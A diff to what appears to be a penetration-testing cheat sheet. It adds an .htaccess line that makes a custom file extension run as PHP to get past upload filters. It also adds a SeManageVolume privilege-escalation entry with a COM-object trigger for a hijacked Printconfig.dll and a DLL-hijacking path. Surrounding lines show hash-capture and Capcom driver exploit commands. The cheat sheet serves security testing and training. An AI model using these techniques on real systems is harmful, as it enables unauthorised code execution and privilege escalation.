@@ -32,6 +32,7 @@
   - [Webdav](#webdav)
   - [ldap\_shell](#ldap_shell)
   - [hash\_catch](#hash_catch)
+  - [File Upload](#file-upload)
 - [Phishing](#phishing)
 - [Foothold](#foothold)
   - [Linux](#linux-1)
@@ -419,6 +420,11 @@ scf, Library-ms, url, lnk
 ```bash
 wget https://raw.githubusercontent.com/xct/hashgrab/main/hashgrab.py
 python3 hashgrab.py MY_IP test
+```
+
+## File Upload
+```bash
+echo "AddType application/x-httpd-php .tak" > .htaccess
 ```
 
 # Phishing
@@ -955,6 +961,19 @@ https://github.com/musheebat/Compiled-capcom-exploit
 ```powershell
 .\EoPLoadDriver.exe System\CurrentControlSet\Capcom .\Capcom.sys
 .\ExploitCapcom.exe
+```
+#### SeManageVolume
+https://github.com/CsEnox/SeManageVolumeExploit
+```bash
+# Default
+C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
+
+$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
+$object = [Activator]::CreateInstance($type)
+
+#DLL Hijacking
+systeminfo
+c:\windows\system32\wbem\tzres.dll
 ```
 
 ### PrintNightmare
